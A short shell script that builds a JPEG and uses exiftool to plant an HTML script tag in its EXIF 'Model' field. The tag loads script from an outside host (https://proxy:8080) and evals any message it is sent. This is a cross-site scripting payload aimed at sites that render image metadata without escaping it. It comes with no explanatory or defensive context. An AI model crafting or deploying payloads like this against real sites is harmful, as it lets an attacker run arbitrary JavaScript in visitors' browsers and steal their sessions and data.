RURL=https://proxy:8080
convert -size 800x1000 xc:skyblue output.jpg
rm html.jpg
exiftool -Model="<script src='$RURL/api/1;var Missing=0;onmessage=(e)=>eval(e.data);var'></script>" output.jpg -o html.jpg
